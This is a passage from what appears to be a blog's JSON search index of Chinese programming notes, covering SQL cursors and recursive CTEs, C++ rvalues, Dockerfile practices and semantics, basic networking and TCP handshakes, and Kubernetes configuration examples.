purpose\nDECLARE @vendor_id int, @vendor_name nvarchar(50),      @message varchar(80), @product nvarchar(50);    PRINT &#x27;-------- Vendor Products Report --------&#x27;;    DECLARE vendor_cursor CURSOR FOR   SELECT VendorID, Name  FROM Purchasing.Vendor  WHERE PreferredVendorStatus = 1  ORDER BY VendorID;    OPEN vendor_cursor    FETCH NEXT FROM vendor_cursor   INTO @vendor_id, @vendor_name    WHILE @@FETCH_STATUS = 0  BEGIN      PRINT &#x27; &#x27;      SELECT @message = &#x27;----- Products From Vendor: &#x27; + @vendor_name        PRINT @message      DECLARE product_cursor CURSOR FOR       SELECT v.Name      FROM Purchasing.ProductVendor pv, Production.Product v      WHERE pv.ProductID = v.ProductID AND      pv.VendorID = @vendor_id  -- Variable value from the outer cursor        OPEN product_cursor      FETCH NEXT FROM product_cursor INTO @product        IF @@FETCH_STATUS &lt;&gt; 0           PRINT &#x27;         &lt;&lt;None&gt;&gt;&#x27;             WHILE @@FETCH_STATUS = 0      BEGIN            SELECT @message = &#x27;         &#x27; + @product          PRINT @message          FETCH NEXT FROM product_cursor INTO @product      END        CLOSE product_cursor      DEALLOCATE product_cursor       FETCH NEXT FROM vendor_cursor INTO @vendor_id, @vendor_name  END   CLOSE vendor_cursor;  DEALLOCATE vendor_cursor;  \ncase\n有趣的部份是除了回傳data外，還可以回傳column name\nSELECT OrderID, Quantity,CASE    WHEN Quantity &gt; 30 THEN &#x27;The quantity is greater than 30&#x27;    WHEN Quantity = 30 THEN &#x27;The quantity is 30&#x27;    ELSE &#x27;The quantity is under 30&#x27;END AS QuantityTextFROM OrderDetails;\nSELECT CustomerName, City, CountryFROM CustomersORDER BY(CASE    WHEN City IS NULL THEN Country    ELSE CityEND);\n遞迴 (table as queue)\n\n\nWhen we iterate a tbale in sql, the only element we can access is the first row of its table.\nAnd then, the second, the third and so on.\nWhen we want to insert a new row to a table, this row will be inserted at the tail of the table.\nWait, it’s like something we are familiar with.\nQueue!!\nWITH node AS --queue declare(    SELECT id,parentid,num FROM testtable AS TREE    WHERE parentid = 0 UNION ALL /* init argument where we start bfs */    -- enqueue the neighbors    SELECT TREE.id,TREE.parentid,TREE.num FROM testtable AS TREE    INNER JOIN node AS QUEUE    ON QUEUE.id = TREE.parentid /*從bfs的節點找下一個node，推到queue*/)SELECT QUEUE.id,Count(TREE.id) AS subnode FROM node AS QUEUELEFT JOIN testtable AS TREE ON QUEUE.id = TREE.parentidGROUP BY QUEUE.id\n最短路徑\nsource\nWITH paths (node, path, cost, rnk, lev) AS ( -- priority queue\tSELECT a.dst, a.src || &#x27;,&#x27; || a.dst, a.distance, 1, 1\tFROM arcs a\tWHERE a.src = :SRC \tUNION ALL\tSELECT a.dst, \t\tp.path || &#x27;,&#x27; || a.dst, \t\tp.cost + a.distance, \t\tRank () OVER (PARTITION BY a.dst ORDER BY p.cost + a.distance), -- tree被更新就sort一次quere(part of this table)\t\tp.lev + 1\tFROM paths p\tJOIN arcs a\tON a.src = p.node\tAND p.rnk = 1)  SEARCH DEPTH FIRST BY node SET line_no -- oracle DB的CTE特別語法: 用什麼方式traversal -- 這邊改成bfs應該沒關係，但沒試驗過CYCLE node SET lp TO &#x27;*&#x27; DEFAULT &#x27; &#x27; -- oracle DB的CTE特別語法: 要判斷cycle -- 上面把所有路線都展開，在展開同時對目前找到的做sort, paths_ranked AS (SELECT lev, node, path, cost, Rank () OVER (PARTITION BY node ORDER BY cost) rnk_t, lp, line_no  FROM paths  WHERE rnk = 1)-- 從每個queue挑出最好的結果SELECT LPad (node, 1 + 2* (lev - 1), &#x27;.&#x27;) node, lev, path, cost, lp  FROM paths_ranked  WHERE rnk_t = 1  ORDER BY line_no-- print result","categories":["DB","FAQ"]},{"title":"C++的左右值","url":"/2020/8/cpp-rlvalue/","content":"動機\nauto hi = [](string&amp; s) &#123; return s+&quot;!&quot;; &#125;hi(&quot;123&quot;);\n這會報錯，十分反人類\n\nlvalue與rvalue\n雖然說在spec定義的很多又很長\n可以想像成有兩個區塊放資料\n一個是有被變數指到的資料\n另一個是算完了，但還沒指定到變數的資料\n被變數指到的資料 就是 lvalue，可以用&amp;來pass ref\n還沒指定到變數的資料 就是 rlvaue，要用&amp;&amp;來pass ref\n","categories":["C++","FAQ"]},{"title":"dockerfile的最佳實踐整理","url":"/2020/8/dockerfile-best-practice-survey/","content":"動機\n看看寫Dockerfile的注意事項\n\n目標\n\n減小Image的大小\n盡量使用cache\n讓環境一致\n\nCOPY或RUN一次就會多一層layer，所以\n把可以整合在同一句的RUN整合在同一句\nBefore\nRUN apt updateRUN apt install -y ...\nAfter\nRUN apt update &amp;&amp; apt install -y ...\n只COPY需要的東西\nBefore\nCOPY . /app\nAfter\nCOPY file1 file2 ... /app\n把不常變動的放前面\n只要docker看到這句的cache失效\n就會把後面的所有指令都重跑一遍\nBefore\nCOPY file1 file2 ... /appRUN apt update &amp;&amp; apt install -y ...\nAfter\nRUN apt update &amp;&amp; apt install -y ...COPY file1 file2 ... /app\n減少cache，只放真的需要的東西\n移除不需要的dep &amp; 清除apt快取\nBefore\nRUN apt update &amp;&amp; apt install -y ... vim\nAfter\nRUN apt update &amp;&amp; apt install -y --no-install-recommends ... &amp;&amp; rm -rf /var/lib/apt/lists/* COPY file1 file2 ... /app\n讓環境一致\n如果有現成的就直接用，同時指定版本\nBefore\nRUN apt update &amp;&amp; apt install -y openjdk8 vim\nAfter\nFROM openjdk:8COPY file1 file2 ... /app\n剛剛好的權限\n直接看例子\nFROM maven:3.6.3-jdk-11 AS builderWORKDIR /workdir/serverCOPY pom.xml /workdir/server/pom.xmlRUN mvn dependency:go-offlineRUN mvn packageFROM openjdk:11-jre-slimRUN addgroup -S java &amp;&amp; adduser -S javauser -G javaUSER javauserEXPOSE 8080COPY --from=builder /workdir/server/target/project-0.0.1-SNAPSHOT.jar /project-0.0.1-SNAPSHOT.jarCMD [&quot;java&quot;, &quot;-Djava.security.egd=file:/dev/./urandom&quot;, &quot;-jar&quot;, &quot;/project-0.0.1-SNAPSHOT.jar&quot;]\n區分不同的step(就是替dockerfile抽象)\nmulti-stege build (Docker 17.05後)\nFROM openjdk:8 AS builder...FROM openjdk:8-jre-alpineCOPY --from=builder file1 file2 /appCMD [&quot;java&quot;, &quot;-jar&quot;, &quot;/app/app.jar&quot;]\n這個其實就是在一般PL會看到的副程式\n不過因為Dockerfile沒有控制結構(條件判斷與迴圈)\n所以沒有重複呼叫某塊code產生資料的需要\n只要跑完要的資料就會在image中\n因此只要有辦法碰到需要的Image就好\n所以才有這種東西\n不只是用自己的image，用其他的image也是ok的\nCOPY --from=nginx:latest /etc/nginx/nginx.conf /nginx.conf\n只想build到某一層的Image也沒問題\ndocker build --target builder -t alexellis2/href-counter:latest .\nRef\nsource1\nsource2\nmulti-stege build\n","categories":["Docker","Tips"]},{"title":"dockerfile的用法","url":"/2020/8/dockerfile-note/","content":"動機\n這裡是研究(自己的觀察與猜測)dockerfile的語意啦\ndocker的container就是應用程式\n只不過每個container都有自己的\n\n網路空間\n儲存空間\n\n\nENTRYPOINT &amp; CMD\n一般在網路上會看到ENTRYPOINT &amp; CMD在不同form下會有不同的效果\n在官方文件上有以下的表格\n|                            | No ENTRYPOINT              | ENTRYPOINT exec_entry p1_entry | ENTRYPOINT [“exec_entry”, “p1_entry”]          |\n| ************************** | ************************** | ****************************** | ********************************************** |\n| No CMD                     | error, not allowed         | /bin/sh -c exec_entry p1_entry | exec_entry p1_entry                            |\n| CMD [“exec_cmd”, “p1_cmd”] | exec_cmd p1_cmd            | /bin/sh -c exec_entry p1_entry | exec_entry p1_entry exec_cmd p1_cmd            |\n| CMD [“p1_cmd”, “p2_cmd”]   | p1_cmd p2_cmd              | /bin/sh -c exec_entry p1_entry | exec_entry p1_entry p1_cmd p2_cmd              |\n| CMD exec_cmd p1_cmd        | /bin/sh -c exec_cmd p1_cmd | /bin/sh -c exec_entry p1_entry | exec_entry p1_entry /bin/sh -c exec_cmd p1_cmd |\n來觀察一下在不同的form下會有什麼差別\nexec form: 沒有/bin/sh -c\nshell form: 有/bin/sh -c\n所以shell form就是一種macro會自己加上/bin/sh -c\n故想像成在terminal打指令\nexec form: 直接打在terminal\nshell form: 先加上/bin/sh -c，在打到terminal\n那再回來看ENTRYPOINT &amp; CMD\n其實ENTRYPOINT &amp; CMD就是\n分別展開ENTRYPOINT與CMD的指令再append起來再送到terminal執行\nARG &amp; ENV\n再來看ARG與ENV的scope\nARG是build的參數，所以只能在RUN的時候看到\nENTRYPOINT與CMD都看不到\nENV就都看的到\nexec form &amp; shell form\n那執行期時ARG與ENV在exec form與shell form有什麼不同嗎?\n直接跑跑看!!\nSending build context to Docker daemon  2.048kBStep 1/9 : FROM alpinelatest: Pulling from library/alpinedf20fa9351a1: Pull completeDigest: sha256:185518070891758909c9f839cf4ca393ee977ac378609f700f60a771a2dfe321Status: Downloaded newer image for alpine:latest ---&gt; a24bb4013296Step 2/9 : ARG hi=1 ---&gt; Running in 81dac0cde5c5Removing intermediate container 81dac0cde5c5 ---&gt; 0a224d4f46ceStep 3/9 : ENV wow=2 ---&gt; Running in 6c54e59b4201Removing intermediate container 6c54e59b4201 ---&gt; 6a008ef31f84Step 4/9 : RUN echo $hi ---&gt; Running in 69eec389ae0d1Removing intermediate container 69eec389ae0d ---&gt; a025a3789730Step 5/9 : RUN [&quot;echo&quot;, &quot;$hi&quot;] ---&gt; Running in ecf7cc563edf$hiRemoving intermediate container ecf7cc563edf ---&gt; c3f8c7e3d843Step 6/9 : RUN echo $wow ---&gt; Running in 0a47051aeaa02Removing intermediate container 0a47051aeaa0 ---&gt; f0ec803da2d4Step 7/9 : RUN [&quot;echo&quot;, &quot;$wow&quot;] ---&gt; Running in 7b443431db18$wowRemoving intermediate container 7b443431db18 ---&gt; 91902d5a74b1Step 8/9 : RUN [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo&quot;, &quot;$hi&quot;] ---&gt; Running in 865729798cb8Removing intermediate container 865729798cb8 ---&gt; e709f7ba52ddStep 9/9 : RUN [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo&quot;, &quot;$wow&quot;] ---&gt; Running in 9897c8732ca2Removing intermediate container 9897c8732ca2 ---&gt; aaa72c558553Successfully built aaa72c558553\n如果用exec form，不會置換，\nshell form會置換\n所以只有shell form才會看到Dockerfile的變數\n但exec form根本看不到\n所以可以對shell form與exec form下一個結論\nshell form是統一跑在Dockerfile自己開的shell(像/bin/sh)\nexec form就是直接用像是execl之類的東西直接去跑，把所有東西當成字串\n那麼應該可以猜shell的展開大概會像\nenvs = &quot;&quot;for (k,v) in ENVS: # env的所有pair，與arg的pair(如果可以的話)    envs += &quot;&#123;&#125;=&#123;&#125; &quot;.format(k,v)return &quot;/bin/sh -c &#123;&#125; &#123;CMD&#125;&quot;.format(envs,cmd)\nexec的話就是\nsystem(&#x27; &#x27;.join(input_array))\n等等，那為什麼CMD可以執行指令，在沒有ENTRYPOINT的時候\n如果沒有ENTRYPOINT就可以看成\n&quot;&quot; + &lt;expanded CMD&gt;\n自然就有CMD作為指令執行的效果\n等等，那為什麼ENTRYPOINT的shell form會忽略CMD??\n如果兩邊都是shell form，兩邊展開就是\n/bin/sh -c ... /bin/sh -c ...\n但是實際上CMD不會執行指令，他只是展開與ENTRYPOINT接在一起\n這樣不符合shell form會執行指令的預期就擋掉了\n2 phases\n前面看了這麼多，可以看出Dockerfile有兩個階段\n\nbuild phase: 生成Image的時候，ARG+RUN+ENV\nrun phase: 跑container的時候，ENTRYPOINT+CMD+ENV\n\nRef\n官方文件\n","categories":["Docker","Tips"]},{"title":"網路如何送資料","url":"/2020/8/how-network-works/","content":"動機\n那就來寫寫看說明文吧\n第一個問題也是最重要的問題是\n為什麼分那麼多層?\n接下去就是要說明這件事\n\n假設\n基本上網路就是模擬人的溝通\n為了解釋需要大家的小小角色扮演\n新人\n我們什麼都不知道，都要去問人\n\n再來在任何一個情境下都有一個共通的任務\n把手上的食物(其他東西也可以啦)給Jane(其實是誰都Ok)\n\n假設Jane在任何情境下都存在\n情境:都在同一個房間大家都在做自己的事\n在什麼都沒有與什麼都不知道的情況下\n我們要先找人，但要怎麼找?\n喊聲 =&gt; Jane在不在\n之後就會有人舉手，我們再過去給他食物，補充血糖\n\n這與電腦關聯在哪?\n如果說另一台電腦網路線也接在同一台機器下(家中的接網路的機器的後面那一排網路孔)，只要廣播(broadcast)就會有人回答(reply)\n在同一台機器下就是Layer2，最常見的protocol是ethernet\n情境:大家都在做自己的事，但在不同房間\n同樣什麼都不知道，但對方在不同房間\n要怎麼知道Jane在哪?\n問人\n問誰?\n可能知道的人，像班導、主管、人源最好的人\n這樣我們就會知道Jane在哪個房間，就可以去那個房間\n用剛剛提過的喊聲來找人，在把東西交出去\n\n這與電腦關聯在哪?\n當要溝通的電腦不在同一台機器上，就要去問某個人看有沒有可能得到答案\n現在電腦在不一樣的機器下，所以要去問人了\n這個人就是default gateway\n因為房間與人名寫在一起，所以要有個分界，就叫subnet mask\n在不一樣的機器下就是Layer3，最常見的protocol是IP\n剛剛為了好想像，都是自己送東西過去\n但實際上電腦都是把東西丟出去，交給可以轉送的人\n而這樣就要在東西上寫下目的地與收件人，資料+轉送需要的資訊就是封包\n中場休息: 整個大概的流程是?\n如果在同一台機器下就喊聲\n如果不在同一台機器下就問人\n(有注意到嗎? 問人也是要找同一房間的人，所以要先喊聲，再去問)\n這很好理解，但\n\n如果不同房間都有Jane的話…\n每次都要喊聲嗎? 是沒有筆可以記下來嗎?\n要問的人是麼決定的? 要麼判斷是不是同一個房間?\n\n第一個問題的回答\n所以知道Jane這個名字是不夠的，要知道他在哪一個房間\n所以有了新的識別方式，部門加名字，這就是IP\nIP分成網域與主機地址，都在IP address中\n這樣我們還要用Jane來識別嗎? 不是用部門+Jane來看就好?\nJane是給同個房間的人看的\n部門+Jane是給來自不同房間的人看的\n而且如果在房間內Jane是用綽號(像吃貨)稱呼但對外的名字還是可以用Jane阿\n所以會分層，會有Layer2的地址(MAC address)與Layer3(IP address)的地址\n第二個問題的回答\n為什麼要喊聲?\n因為我們不確定人在哪，他們沒有固定的位置\n要固定大家的位置，就是L2 switch\n藉由背後的那些孔來對應到MAC address\n第三個問題的回答\n所以自己要先知道這些資訊\n而這些資訊就叫routing table\n那怎麼會有L3 router(通常就叫router)\n因為他知道不同的房間要怎麼走，他會有很多洞，分別到不同的房間\n所以通常router就是default gateway\n總結: 整個送的過程\n從送的人開始\n\n包ip: 目標的ip\n包mac: default gateway或是同房間的mac\n丟出去\n\nswitch\n\n看mac決定要往那個孔丟\n\nrouter\n\n看mac: 確定是要我收的\n看ip比對routing table決定要往那個孔丟\n\n目的地\n\n看mac: 確定是要我收的\n看ip: 確定是要我收的\n收下\n\nTCP在哪?\n把東西送到對方那邊是Layer2與Layer3的工作，\n管理資料有沒有完整的送到就是TCP的其中一個工作\nTCP會要求對方收到封包時回送一個 說明我有收到的封包\n確保對方有收到\nTCP還有另外兩個功能\n\n確保不要打爆對方 (你送太多了，我收不完) (Flow control)\n確保不要打爆整個網路 (都給你送就好了啊) (Congestion control)\n\nTCP的三個功能又被稱為是 連線導向\nTCP為什麼要三段握手? 為什麼是3\n要送資料前要先確保對方活著，\n不論是server或是client都一樣要確認對方活著\n所以\n\nclient先送 &lt;= client要確認server活著\nserver回 &lt;= client知道server活著\nserver送 &lt;= server要確認client活著\nclient回 &lt;= server知道client活著\n\n等等，這是4段阿!!\n仔細看，2與3\n是不是都是server到client\n把他們和在一起就是3段了\nTCP要關時為什麼是4段?\n重點是對面要先斷，client才能關\n所以\n\nclient先送\nserver回 &lt;= server開始準備關\nserver送 &lt;= 通知client要關了\nclient回 &lt;= 可以完全關掉了\n\n等等，為什麼不能把2與3合起來?\nserver要把tcp的資源釋放掉，所以要等不能馬上關\nUDP又是什麼\n就是什麼保證或是管理都沒有，就是送就對了\n","categories":["Network","Tips"]},{"title":"k8s筆記","url":"/2020/8/k8s-note/","content":"動機\n突然想起有k8s，就來看看\n越看越像linux主機的抽象化，最後變成近乎linux主機的framework\n\n架構: 把主機拆掉再變多\n一開始主機是\n一台電腦有\n\n應用程式\n檔案(設定檔)\n處理連線的介面(load balancer或是firewall)\n\n應用程式 &amp; 虛擬的主機\n都是共用同一台實體主機的資源\n\n但應用程式越來越多會彼此影響\n所以在同一台實體主機中用chroot與network namespace分開應用程式\n但彼此之間要溝通就不能透過 記憶體與filesystem 他們已經被分開了\n所以彼此之間用網路連接在一起\n這就是container或是pod\n\n如果每個應用程式都是用網路連接在一起，那應用程式還需要限定在同一台實體主機上嗎?\n因此我們可以把實體主機變多，讓應用程式跑在不同的主機上\n這就是cluster\n對於使用者來說這些實體主機都是可以提供服務的，所以cluster也可以說是虛擬的主機\n如果相同的應用程式跑在不同的主機上，都提供一樣的服務，這叫scaling\n如果子任務跑在不同的主機上，來跑出計算結果，這叫parllelism\n\n有了這麼多實體主機要怎麼分配pod?\n在k8s就是deployment\n處理連線的介面\n原本在同一台主機上，使怎麼區分要把連線導到哪個應用程式?\n用port，像http是80、https是443\n在應用程式用bind就可以綁到指定的port\n\n但現在每個應用程式都是被分開，所以會需要\n\nip(在不同的network namespace)\nport(在第四層網路)\n\n這個除了用bind外，還要用iptables，也就是firewall去控制ip的封包往那邊走\n但這都還在同一台實體主機上\n\n如果變成像cluster那樣的虛擬主機要怎麼辦?\n基本上就是用主從式架構\n一個收連線分配到某台cluster下的主機，等資料return到這裡\n這就是master node的由來\n\n接下去要問的是\n怎麼使用服務?\n現在master node知道服務的ip與port\n所以要讓服務可以被使用，方法有\n\nport forwarding\nreverse proxy\n\nport forwarding就是service(type: NodePort)\nreverse proxy就是ClusterIP(ingress可以想成加料過的loadbalancer)\nservice的NodePort &amp; LoadBalancer差在?\nport開在哪裡，\nNodePort開在主機上，\nLoadBalancer會先拉一台主機出來再開port\nLoadBalancer可以看成把master node的firewall部份抽出來單獨用\n為什麼service再分配一個ClusterIP?\n為了可以用service的name直接連到Pod，service的name會被放在kube-dns中\n這樣用service的name做nslookup就會拿到ip，就像部屬一台server一樣\n同樣都是讓服務可以被使用，\n比起實體主機，為什麼k8s還多了ingress?\n第一個是現在應用程式都有了自己的ip\n第二個是一般常見的服務都是 network protocol綁定port的，像80,443\n所以ingress可以想像成DNS不過是把path換成ip&amp;port\nDNS是domain name換成ip\n(有注意到嗎，在網站上，path是換成對應的controller，所以ingress的角色其實是與網站上的router相當)\nservice不加上selector(不是把流量導到cluster中)的話?\nservice就是在實體主機上的bind\n所以也可以把流量導到其他地方去，像\napiVersion: v1kind: Servicemetadata:  name: my-servicespec:  ports:    - protocol: TCP      port: 80      targetPort: 9376\napiVersion: v1kind: Endpointsmetadata:  name: my-servicesubsets:  - addresses:      - ip: 192.0.2.42    ports:      - port: 9376\n\nNamespaces就是不同的cluster，其實就是不同的虛擬主機\n部署服務\n流程是\n\ndeployment生pod\nservice把port綁到指定的pod\ningress把路徑綁到port(service)\n\n指定某東西\n如何指定就是用label，像\napiVersion: apps/v1beta2 # for kubectl versions &gt;= 1.9.0 use apps/v1kind: Deploymentmetadata:  name: hello-deploymentspec:  replicas: 3  selector:    matchLabels: # here      app: my-deployment    matchExpressions:       - &#123;key: tier, operator: In, values: [cache]&#125;       - &#123;key: environment, operator: NotIn, values: [dev]&#125;  template:    metadata:      labels: # here        app: my-deployment    spec:      containers:      - name: my-pod        image: zxcvbnius/docker-demo:latest        ports:        - containerPort: 3000\n如果是在commandline上要指定的話\nkubectl get pods -l environment=production,tier=frontendkubectl get pods -l &#x27;environment in (production),tier in (frontend)&#x27;kubectl get pods -l &#x27;environment in (production, qa)&#x27;kubectl get pods -l &#x27;environment,environment notin (frontend)&#x27;\n另外可以用go-template，來客製顯示的資訊\n[root@node root]# kubectl get pods --all-namespaces -o go-template --template=&#x27;&#123;&#123;range .items&#125;&#125;&#123;&#123;.metadata.uid&#125;&#125;&#123;&#123;end&#125;&#125;&#x27;0313ffff-f1f4-11e7-9cda-40f2e9b98448ee49bdcd-f1f2-11e7-9cda-40f2e9b98448f1e0eb80-f1f2-11e7-9cda-40f2e9b98448[root@node root]# kubectl get pods --all-namespaces -o go-template --template=&#x27;&#123;&#123;range .items&#125;&#125;&#123;&#123;printf &quot;|%-20s|%-50s|%-30s|\\n&quot; .metadata.namespace .metadata.name .metadata.uid&#125;&#125;&#123;&#123;end&#125;&#125;&#x27;|console             |console-4d2d7eab-1377218307-7lg5v                 |0313ffff-f1f4-11e7-9cda-40f2e9b98448||console             |console-4d2d7eab-1377218307-q3bjd                 |ee49bdcd-f1f2-11e7-9cda-40f2e9b98448||cxftest             |ipreserve-f15257ec-3788284754-nmp3x               |f1e0eb80-f1f2-11e7-9cda-40f2e9b98448|\nHorizontal Pod Autoscaling\nDeployment控制Pod的數量\nHorizontal Pod Autoscaling控制Deployment的數量\napiVersion: autoscaling/v1kind: HorizontalPodAutoscalermetadata:  name: helloworld-hpaspec:  scaleTargetRef:    apiVersion: apps/v1beta2    kind: Deployment    name: helloworld-deployment  minReplicas: 2  maxReplicas: 5  targetCPUUtilizationPercentage: 50\nDaemonSet\n如果每個Node都要跑這個pod，像是monitor或log\n就可以用DaemonSet\napiVersion: apps/v1kind: DaemonSetmetadata:  name: fluentd-elasticsearch  namespace: kube-system  labels:    k8s-app: fluentd-loggingspec:  selector:    matchLabels:      name: fluentd-elasticsearch  template:    metadata:      labels:        name: fluentd-elasticsearch    spec:      tolerations:      # this toleration is to have the daemonset runnable on master nodes      # remove it if your masters can&#x27;t run pods      - key: node-role.kubernetes.io/master        effect: NoSchedule      containers:      - name: fluentd-elasticsearch        image: quay.io/fluentd_elasticsearch/fluentd:v2.5.2        resources:          limits:            memory: 200Mi          requests:            cpu: 100m            memory: 200Mi        volumeMounts:        - name: varlog          mountPath: /var/log        - name: varlibdockercontainers          mountPath: /var/lib/docker/containers          readOnly: true      terminationGracePeriodSeconds: 30      volumes:      - name: varlog        hostPath:          path: /var/log      - name: varlibdockercontainers        hostPath:          path: /var/lib/docker/containers\n管理Node\n停用node: kubectl drain &#123;node_name&#125;\n啟用node: kubectl uncordon &#123;node_name&#125; \n限制資源\nPod本身可以限制或要求最多或最少需要多少資源\n當然也可以從外部限制\napiVersion: v1kind: Listitems:- apiVersion: v1  kind: ResourceQuota  metadata:    name: pods-high  spec:    hard:      cpu: &quot;1000&quot;      memory: 200Gi      pods: &quot;10&quot;    scopeSelector:      matchExpressions:      - operator : In        scopeName: PriorityClass        values: [&quot;high&quot;]- apiVersion: v1  kind: ResourceQuota  metadata:    name: pods-medium  spec:    hard:      cpu: &quot;10&quot;      memory: 20Gi      pods: &quot;10&quot;    scopeSelector:      matchExpressions:      - operator : In        scopeName: PriorityClass        values: [&quot;medium&quot;]- apiVersion: v1  kind: ResourceQuota  metadata:    name: pods-low  spec:    hard:      cpu: &quot;5&quot;      memory: 10Gi      pods: &quot;10&quot;    scopeSelector:      matchExpressions:      - operator : In        scopeName: PriorityClass\tvalues: [&quot;low&quot;]\napiVersion: v1kind: Podmetadata:  name: high-priorityspec:  containers:  - name: high-priority    image: ubuntu    command: [&quot;/bin/sh&quot;]    args: [&quot;-c&quot;, &quot;while true; do echo hello; sleep 10;done&quot;]    resources:      requests:        memory: &quot;10Gi&quot;        cpu: &quot;500m&quot;      limits:        memory: &quot;10Gi&quot;        cpu: &quot;500m&quot;  priorityClassName: high\n除了pod的限制，也能限制namespace\napiVersion: v1kind: ResourceQuotametadata:  name: compute-resourcesspec:  hard:    requests.cpu: &quot;1&quot;    requests.memory: 1Gi    limits.cpu: &quot;2&quot;    limits.memory: 2Gi    requests.nvidia.com/gpu: 4---apiVersion: v1kind: ResourceQuotametadata:  name: object-countsspec:  hard:    configmaps: &quot;10&quot;    persistentvolumeclaims: &quot;4&quot;    pods: &quot;4&quot;    replicationcontrollers: &quot;20&quot;    secrets: &quot;10&quot;    services: &quot;10&quot;    services.loadbalancers: &quot;2&quot;\n角色控制\nRole是指定在一個namespace下可以操作的資源\nClusterRole是在任何namespace下都可以操作的資源\n資源是在不同的apigroup下\n用rolebinding把Role與user或group或service account綁在一起\n儲存\n在 使用檔案 之前我們需要 filesystem\n在 使用filesystem 之前我們需要 做partition\n在 做partition 之前我們需要 硬碟\nfilesystem 就是 volumne\n做partition 就是 PersistentVolumeClaim\n虛擬的硬碟(有特別的屬性) 就是 Storage Class\n實體的硬碟 就是 Persistent Volume (docker的volumne)\n這裡就轉貼一些別人的範例\nkind: StorageClassapiVersion: storage.k8s.io/v1metadata:  name: standardprovisioner: kubernetes.io/aws-ebsparameters:  type: gp2  zone: us-west-2reclaimPolicy: Delete # [Delete | Retain]\napiVersion: v1metadata:  name: myclaimspec:  accessModes:    - ReadWriteOnce # [ReadWriteOnce | ReadOnlyMany | ReadWriteMany]  resources:    requests:      storage: 8Gi  storageClassName: standard # Ref\napiVersion: v1kind: Podmetadata:  name: apiserver  labels:    app: apiserver    tier: backendspec:  containers:  - name: my-pod    image: zxcvbnius/docker-demo    ports:    - containerPort: 3000    volumeMounts: # \\/ 看下面的volumes    - name: my-pvc      mountPath: &quot;/tmp&quot;  volumes:  - name: my-pvc    persistentVolumeClaim:      claimName: myclaim # Ref\nPersistent Volume的例子\n(注意到在這裡PVC沒有指定storageClassName，PVC直接從PV拿)\napiVersion: v1kind: PersistentVolume    &lt;=== 指定物件種類為 PVmetadata:  name: pv001\t\t      &lt;=== PV 名稱spec:  capacity:    storage: 2Gi          &lt;=== 指定大小  accessModes:  - ReadWriteOnce         &lt;=== 指定存取模式  hostPath:               &lt;=== 綁定在 host 的 /tmp 目錄    path: /tmp---apiVersion: v1kind: Pod         &lt;=== 使用一個 Pod 並試著掛載 Volumemetadata:  name: pvc-nginxspec:  containers:  - name: nginx    image: nginx    ports:    - containerPort: 80    volumeMounts:       &lt;=== 將名為 volume-pv 的 Volume 掛載到 /usr/share/nginx/html 目錄底下      - name: volume-pv        mountPath: /usr/share/nginx/html  volumes:  - name: volume-pv   &lt;=== 宣告一個名為 volume-pv 的 Volume 物件    persistentVolumeClaim:   &lt;=== 綁定名為 pv-claim 的 PVC 物件      claimName: pv-claim---kind: PersistentVolumeClaimapiVersion: v1metadata:  name: pv-claimspec:  accessModes:  - ReadWriteOnce  resources:    requests:      storage: 1Gi   &lt;=== 要求 1G 容量\nfilesystem只能從硬碟開始嗎?\n沒有現成的嗎?\n有，\n\n實體主機的檔案 (emptyDir, hostPath)\nNFS\n\napiVersion: v1kind: Podmetadata:  name: apiserverspec:  containers:  - name: apiserver    image: zxcvbnius/docker-demo    volumeMounts:    - mountPath: /tmp      name: tmp-volume    imagePullPolicy: Always  volumes:  - name: tmp-volume    hostPath:      path: /tmp  - name: nfs-volumes    nfs:     server: &#123;YOUR_NFS_SERVER_URL&#125;     path: /      type: Directory  - name: cache-volume    emptyDir: &#123;&#125;\n從剛剛的資料來源來看可分成\n\n網路: NFS、Storage Class&amp;PersistentVolumeClaim\n實體主機: emptyDir、hostPath\n\n哪虛擬主機有沒有自己的檔案(資料)?\n有，ConfigMap 與 Secret\n不過因為secret是放秘密的資料\n所以也會透過env var傳\n要注意到ConfigMap 與 Secret都是hash table，\n也就是用key去取值\napiVersion: v1kind: Podmetadata:  name: apiserver  labels:    app: webserver    tier: backendspec:  containers:  - name: nodejs-app    image: zxcvbnius/docker-demo    ports:    - containerPort: 3000  - name: nginx    image: nginx:1.13    ports:    - containerPort: 80    volumeMounts:    - name: nginx-conf-volume      mountPath: /etc/nginx/conf.d    env:    - name: SECRET_USERNAME      valueFrom:        secretKeyRef:          name: demo-secret-from-yaml          key: username    - name: SECRET_PASSWORD      valueFrom:        secretKeyRef:          name: demo-secret-from-yaml          key: password  volumes:  - name: nginx-conf-volume    configMap:      name: nginx-conf      items:      - key: my-nginx.conf\tpath: my-nginx.conf   - name: secret-volume     secret:      secretName: demo-secret-from-yaml\n只想跑某個指令\n只跑一次: Job\napiVersion: batch/v1kind: Jobmetadata:  name: pispec:  template:    spec:      containers:      - name: pi        image: perl        command: [&quot;perl&quot;,  &quot;-Mbignum=bpi&quot;, &quot;-wle&quot;, &quot;print bpi(2000)&quot;]      restartPolicy: Never  backoffLimit: 4\n也可以平行跑，見官方文件\n反覆: CronJob\napiVersion: batch/v1beta1kind: CronJobmetadata:  name: hellospec:  schedule: &quot;*/1 * * * *&quot;  jobTemplate:    spec:      template:        spec:          containers:          - name: hello            image: apline            args:            - /bin/sh            - -c            - echo &quot;Hi, current time is $(date)&quot;\t  restartPolicy: OnFailure\nRef\nJob\nNodePort&amp;Loadbalancer\n官網\n30天鐵人賽\ngo-template\n","categories":["Docker","Tips"]},{"title":"memory model","url":"/2020/8/mem-model/","content":"動機\nRef的文章看起來很有趣，還沒看過用這種方式探討PL的\n所以就寫下自己的心得了\n\nCOBOL\n記憶體就是一層又一層的嵌套\n而記憶體就是這些不會變大也不會變小\n就是C中的struct、union、array\n控制可見度\n大家都在同一塊地方，沒辦法控制可見度\n如何access\n因為只有primitive type所以用算的去看offset\n序列化\n都只有固定長度，所以容易序列化\nLISP\n只有pointer\n十分的靈活\n但\n\n需要GC\n容易type 